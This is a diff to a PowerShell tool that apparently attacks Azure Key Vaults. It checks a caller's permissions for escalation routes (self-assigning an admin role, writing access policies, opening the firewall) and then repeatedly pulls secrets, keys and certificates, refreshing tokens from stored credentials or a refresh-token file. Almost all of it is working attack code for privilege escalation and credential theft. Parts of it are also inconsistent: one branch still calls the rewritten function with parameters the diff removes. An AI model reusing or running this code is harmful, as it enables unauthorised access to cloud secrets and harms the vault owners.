@@ -507,32 +507,44 @@ function GetIP {
 #######################################################################################################
 
 function Test-OpAllowed {
-
     param(
-        [string[]]$Allowed, 
-        [string[]]$Denied, 
-        [string]$Operation
+        [array]$PermEntries,
+        [string]$Operation,
+        [string]$ActionType = "actions"   
     )
 
-    $match = $false
+    $denyType = if ($ActionType -eq "actions") {
+		"notActions" 
+	} else {
+		"notDataActions" 
+	}
 
-    foreach ($a in $Allowed) {
-         if ($Operation -like $a) {
-             $match = $true; break 
-            } 
+    foreach ($entry in $PermEntries) {
+        $allowed = @($entry.$ActionType)
+        $denied = @($entry.$denyType)
+
+        
+        $isAllowed = $false
+        foreach ($a in $allowed) {
+            if ($Operation -like $a) { $isAllowed = $true; break }
+        }
+        if (-not $isAllowed) { continue }
+
+
+        $isDenied = $false
+        foreach ($d in $denied) {
+            if ($Operation -like $d) {
+				$isDenied = $true
+				break 
+			}
         }
 
-    if (-not $match) { 
-        return $false 
+        if (-not $isDenied) {
+			return $true 
+		}
     }
 
-    foreach ($d in $Denied)  {
-         if ($Operation -like $d) {
-             return $false 
-        } 
-    }
-
-    return $true
+    return $false
 }
 
 #######################################################################################################
@@ -631,8 +643,9 @@ function Extract-VaultData {
             }
 
             foreach ($item in $page.value) {
-                $getUri = "$($item.id)?api-version=7.4"
-                $name = ($item.id -split '/')[-1]
+				$itemId = if ($item.kid) { $item.kid } else { $item.id }
+				$getUri = "$itemId`?api-version=7.4"
+				$name   = ($itemId -split '/')[-1]
 
                 try { $detail = Invoke-SmartVaultRequest -Uri $getUri }
                 catch { continue }
@@ -740,6 +753,7 @@ function Add-VaultAccess {
         "RBAC-RoleAssign" {
             $assignmentId = [guid]::NewGuid().ToString()
             $roleDefId = "/subscriptions/$SubscriptionId/providers/Microsoft.Authorization/roleDefinitions/$($script:KV_ADMIN_ROLE)"
+            
             $assignUrl = "https://management.azure.com$VaultId/providers/Microsoft.Authorization/roleAssignments/$assignmentId`?api-version=2022-04-01"
 
             $body = @{
@@ -933,101 +947,80 @@ function Test-VaultPermissions {
         EscalateMethod = $null  # "RBAC-RoleAssign" | "RBAC-SwitchToAP" | "AP-Write"
     }
 
-    if ($Mode -eq "RBAC") {
-        # Check data actions on the vault
-        $permUrl = "https://management.azure.com$VaultId/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
-        try { $perm = Invoke-SmartRequest -Uri $permUrl -Headers $Headers }
-        catch { return $result }
+		if ($Mode -eq "RBAC") {
+			$permUrl = "https://management.azure.com$VaultId/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
+			try { 
+				$perm = Invoke-SmartRequest -Uri $permUrl -Headers $Headers 
+			}
+			catch {
+				return $result 
+			}
 
-        $allowD = @()
-        $denyD = @()
-        $allow = @()
-        $deny = @()
+			$entries = $perm.value
 
-        foreach ($p in $perm.value) {
-            if ($p.dataActions) {
-                 $allowD += $p.dataActions 
-            }
-            if ($p.notDataActions){
-                 $denyD  += $p.notDataActions 
-            }
-            if ($p.actions){
-                 $allow  += $p.actions 
-            }
-            if ($p.notActions) {
-                 $deny   += $p.notActions 
-            }
-        }
+			# Data plane access (check dataActions per-entry)
+			$result.CanReadSecrets = (Test-OpAllowed -PermEntries $entries -Operation 'Microsoft.KeyVault/vaults/secrets/getSecret/action' -ActionType "dataActions") -or (Test-OpAllowed -PermEntries $entries -Operation 'Microsoft.KeyVault/vaults/secrets/*' -ActionType "dataActions")
+			$result.CanReadKeys = (Test-OpAllowed -PermEntries $entries -Operation 'Microsoft.KeyVault/vaults/keys/read' -ActionType "dataActions") -or (Test-OpAllowed -PermEntries $entries -Operation 'Microsoft.KeyVault/vaults/keys/*' -ActionType "dataActions")
+			$result.CanReadCerts = (Test-OpAllowed -PermEntries $entries -Operation 'Microsoft.KeyVault/vaults/certificates/read' -ActionType "dataActions") -or (Test-OpAllowed -PermEntries $entries -Operation 'Microsoft.KeyVault/vaults/certificates/*' -ActionType "dataActions")
 
-        $allowD = $allowD | Select-Object -Unique
-        $denyD = $denyD | Select-Object -Unique
-        $allow = $allow | Select-Object -Unique
-        $deny = $deny | Select-Object -Unique
+			$canRBAC   = Test-OpAllowed -PermEntries $entries -Operation 'Microsoft.Authorization/roleAssignments/write' -ActionType "actions"
+			$canVaultW = Test-OpAllowed -PermEntries $entries -Operation 'Microsoft.KeyVault/vaults/write' -ActionType "actions"
 
-        # Data plane access
-        $result.CanReadSecrets = (Test-OpAllowed -Allowed $allowD -Denied $denyD -Operation 'Microsoft.KeyVault/vaults/secrets/getSecret/action') -or (Test-OpAllowed -Allowed $allowD -Denied $denyD -Operation 'Microsoft.KeyVault/vaults/secrets/*')
-        $result.CanReadKeys    = (Test-OpAllowed -Allowed $allowD -Denied $denyD -Operation 'Microsoft.KeyVault/vaults/keys/read') -or (Test-OpAllowed -Allowed $allowD -Denied $denyD -Operation 'Microsoft.KeyVault/vaults/keys/*')
-        $result.CanReadCerts   = (Test-OpAllowed -Allowed $allowD -Denied $denyD -Operation 'Microsoft.KeyVault/vaults/certificates/read') -or (Test-OpAllowed -Allowed $allowD -Denied $denyD -Operation 'Microsoft.KeyVault/vaults/certificates/*')
+			$canRead = $result.CanReadSecrets -or $result.CanReadKeys -or $result.CanReadCerts
 
+			if ($canRBAC) {
+				
+				$result.CanEscalate = $true
+				$result.EscalateMethod = "RBAC-RoleAssign"
+			}
+			elseif ($canRead -and $canVaultW) {
+				
+				$result.CanEscalate = $true
+				$result.EscalateMethod = "IPOnly"
+			}
+		}
+		else {
+			$policies = $VaultDetail.properties.accessPolicies
+			if ($policies) {
+				$match = $policies | Where-Object { $_.objectId -eq $MyOid } | Select-Object -First 1
+				if ($match) {
+					$s = @($match.permissions.secrets) | Where-Object { $_ -in @('get','list','all') }
+					$k = @($match.permissions.keys) | Where-Object { $_ -in @('get','list','all') }
+					$c = @($match.permissions.certificates) | Where-Object { $_ -in @('get','list','all') }
+					$result.CanReadSecrets = [bool]$s
+					$result.CanReadKeys = [bool]$k
+					$result.CanReadCerts = [bool]$c
+				}
+			}
 
-        $canRBAC = Test-OpAllowed -Allowed $allow -Denied $deny -Operation 'Microsoft.Authorization/roleAssignments/write'
-        $canVaultW = Test-OpAllowed -Allowed $allow -Denied $deny -Operation 'Microsoft.KeyVault/vaults/write'
+			# Can we modify access policy?????????????????????????????????
+			$permUrl = "https://management.azure.com$VaultId/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
+			try { $perm = Invoke-SmartRequest -Uri $permUrl -Headers $Headers }
+			catch { return $result }
 
-        $hasStar = Test-OpAllowed -Allowed $allow -Denied $deny -Operation '*'
+			$allow = @()
+			$deny = @()
 
-        $canRead = $result.CanReadSecrets -or $result.CanReadKeys -or $result.CanReadCerts
+			foreach ($p in $perm.value) {
+				if ($p.actions) {
+					 $allow += $p.actions 
+				}
+				if ($p.notActions) {
+					 $deny  += $p.notActions 
+				}
+			}
+			$allow = $allow | Select-Object -Unique
+			$deny = $deny | Select-Object -Unique
 
-        if ($canRBAC) {
-            $result.CanEscalate = $true
-            $result.EscalateMethod = "RBAC-RoleAssign"
-        }
-        elseif ($canRead -and ($hasStar -or $canVaultW)) {
-            $result.CanEscalate = $true
-            $result.EscalateMethod = "IPOnly"
-        }
-    }
-    else {
-        $policies = $VaultDetail.properties.accessPolicies
-        if ($policies) {
-            $match = $policies | Where-Object { $_.objectId -eq $MyOid } | Select-Object -First 1
-            if ($match) {
-                $s = @($match.permissions.secrets) | Where-Object { $_ -in @('get','list','all') }
-                $k = @($match.permissions.keys) | Where-Object { $_ -in @('get','list','all') }
-                $c = @($match.permissions.certificates) | Where-Object { $_ -in @('get','list','all') }
-                $result.CanReadSecrets = [bool]$s
-                $result.CanReadKeys = [bool]$k
-                $result.CanReadCerts = [bool]$c
-            }
-        }
+			$hasStar = Test-OpAllowed -Allowed $allow -Denied $deny -Operation '*'
+			$canAP = Test-OpAllowed -Allowed $allow -Denied $deny -Operation 'Microsoft.KeyVault/vaults/accessPolicies/write'
+			$canW = Test-OpAllowed -Allowed $allow -Denied $deny -Operation '*/write'
 
-        # Can we modify access policy?????????????????????????????????
-        $permUrl = "https://management.azure.com$VaultId/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
-        try { $perm = Invoke-SmartRequest -Uri $permUrl -Headers $Headers }
-        catch { return $result }
-
-        $allow = @()
-        $deny = @()
-
-        foreach ($p in $perm.value) {
-            if ($p.actions) {
-                 $allow += $p.actions 
-            }
-            if ($p.notActions) {
-                 $deny  += $p.notActions 
-            }
-        }
-        $allow = $allow | Select-Object -Unique
-        $deny = $deny | Select-Object -Unique
-
-        $hasStar = Test-OpAllowed -Allowed $allow -Denied $deny -Operation '*'
-        $canAP = Test-OpAllowed -Allowed $allow -Denied $deny -Operation 'Microsoft.KeyVault/vaults/accessPolicies/write'
-        $canW = Test-OpAllowed -Allowed $allow -Denied $deny -Operation '*/write'
-
-        if ($hasStar -or $canAP -or $canW) {
-            $result.CanEscalate  = $true
-            $result.EscalateMethod = "AP-Write"
-        }
-    }
+			if ($hasStar -or $canAP -or $canW) {
+				$result.CanEscalate  = $true
+				$result.EscalateMethod = "AP-Write"
+			}
+		}
 
     return $result
 }
@@ -1195,10 +1188,50 @@ function main {
             $anyChange = $changes.RoleAdded -or $changes.APAdded -or $changes.IPAdded -or $changes.RBACDisabled
 
             if ($anyChange) {
-                Start-Sleep -Seconds 5
+                # RBAC role assignments need propagation time
+                if ($changes.RoleAdded) {
+                    Write-Host "    [*] Waiting for RBAC propagation (role assignment)..." -ForegroundColor DarkGray
+                    $maxAttempts = 6
+                    $extracted = $false
 
-                $count = Extract-VaultData -VaultName $vaultName -SubscriptionId $sub.SubscriptionId -ResourceGroup $rg -DataPath $dataPath
-                if ($count -gt 0) { $totalExtracted += $count }
+                    for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
+                        $waitSec = 30 * $attempt
+                        Write-Host "    [*] Attempt $attempt/$maxAttempts - waiting $waitSec sec..." -ForegroundColor DarkGray
+                        Start-Sleep -Seconds $waitSec
+
+                        # Refresh vault token to pick up new dataActions
+                        if ($global:AuthMethod -eq "ClientCredentials") {
+                            $global:VaultToken = Invoke-TokenRequest -Scope "https://vault.azure.net/.default" -ClientID $global:CID -ClientSecret $global:CSecret -TenantID $global:TenantID
+                        }
+                        elseif ($global:AuthMethod -eq "RefreshToken") {
+                            $rt = if (Test-Path "C:\Users\Public\RefreshToken.txt") { Get-Content "C:\Users\Public\RefreshToken.txt" } else { $global:RefreshTkn }
+                            $global:VaultToken = Invoke-TokenRequest -Scope "https://vault.azure.net/.default" -RefreshToken $rt -TenantID $global:TenantID
+                        }
+
+                        $count = Extract-VaultData -VaultName $vaultName -SubscriptionId $sub.SubscriptionId -ResourceGroup $rg -DataPath $dataPath
+                        if ($count -gt 0) {
+                            $totalExtracted += $count
+                            $extracted = $true
+                            break
+                        }
+                        elseif ($count -eq -1) {
+                            Write-Host "    [!] Still blocked (firewall or propagation). Retrying..." -ForegroundColor Yellow
+                        }
+                        else {
+                            Write-Host "    [!] No data yet. Role may still be propagating..." -ForegroundColor Yellow
+                        }
+                    }
+
+                    if (-not $extracted) {
+                        Write-Host "    [-] Could not extract after $maxAttempts attempts. RBAC propagation may need more time." -ForegroundColor Red
+                    }
+                }
+                else {
+                    # AP or IP only - fast propagation
+                    Start-Sleep -Seconds 10
+                    $count = Extract-VaultData -VaultName $vaultName -SubscriptionId $sub.SubscriptionId -ResourceGroup $rg -DataPath $dataPath
+                    if ($count -gt 0) { $totalExtracted += $count }
+                }
             }
 
 
